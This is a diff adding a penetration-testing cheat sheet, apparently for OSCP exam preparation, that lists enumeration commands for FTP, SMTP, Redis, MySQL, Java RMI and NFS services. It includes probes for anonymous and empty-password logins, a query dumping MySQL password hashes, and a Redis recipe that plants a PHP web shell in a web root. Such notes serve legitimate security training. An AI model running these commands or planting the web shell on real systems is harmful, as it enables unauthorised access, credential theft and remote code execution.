@@ -1,0 +1,77 @@
+######################################################################
+# 06 – LESS COMMON SERVICE ENUMERATION (OSCP 2025)
+######################################################################
+
+===============================
+# FTP ENUMERATION
+===============================
+# Anonymous login test
+ftp $targetip
+# credentials:
+#   username: anonymous
+#   password: anonymous
+
+# Check writable directories
+put test.txt
+
+# Banner grab
+nc -nv $targetip 21
+
+===============================
+# SMTP ENUMERATION (VRFY / EXPN)
+===============================
+nc -nv $targetip 25
+VRFY root
+VRFY admin
+VRFY test
+EXPN users
+
+# Nmap SMTP scripts
+nmap --script smtp-enum-users -p25 $targetip
+
+===============================
+# REDIS ENUMERATION
+===============================
+redis-cli -h $targetip
+INFO
+CONFIG GET *
+KEYS *
+SELECT 0
+GET <key>
+
+# Redis RCE (only if writeable)
+# CONFIG SET dir /var/www/html
+# CONFIG SET dbfilename shell.php
+# SET shell "<?php system($_GET['cmd']); ?>"
+# SAVE
+
+===============================
+# MYSQL ENUMERATION
+===============================
+# Test empty root login
+mysql -h $targetip -u root
+mysql -h $targetip -u root -p''
+
+# Check databases
+SHOW DATABASES;
+
+# Check users
+SELECT user,host,password FROM mysql.user;
+
+===============================
+# JAVA RMI ENUMERATION (Port 1099)
+===============================
+nmap --script=rmi-dumpregistry -p 1099 $targetip
+nmap --script=rmi-vuln-classloader -p 1099 $targetip
+
+===============================
+# RPCBIND ENUMERATION
+===============================
+rpcinfo -p $targetip
+
+# Check for NFS exports
+showmount -e $targetip
+
+######################################################################
+# END OF LESS COMMON SERVICE ENUM
+######################################################################
